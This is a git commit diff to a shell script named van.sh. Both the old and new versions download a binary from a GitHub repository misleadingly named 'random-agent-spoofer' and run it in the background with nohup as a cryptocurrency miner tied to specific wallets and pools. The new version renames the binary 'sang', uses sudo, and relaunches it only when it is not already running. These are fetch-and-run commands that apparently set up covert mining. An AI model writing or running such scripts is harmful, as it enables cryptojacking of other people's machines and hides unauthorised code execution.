0b57bd3c5c8bae0559260b907a0a2e36b25ae92c
trangtrau <30510221+trangtrau@users.noreply.github.com>
2023-01-14 22:26:08 +0700

    Update van.sh

--- van.sh
+++ van.sh
@@ -1,3 +1,16 @@
 #!/bin/bash
-wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar && chmod +x ar 
-nohup ./ar -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RQwAiGZmVsR95WuzeijuX2wTvYnTdKhbAh.TEST2703 -p x &
+count=`pgrep sang |  grep -o -E '[0-9]+'`
+
+if [[ $count == "" ]]
+then
+  echo "ko ton tai"
+  wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/astro -O sang 
+ sudo chmod +x sang
+ nohup ./sang  -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcpvuc95p8a0rssl0xhzl -r community-pools.mysrv.cloud:10300 -p rpc &
+ 
+else
+echo "dang ton tai"
+
+fi
+
+
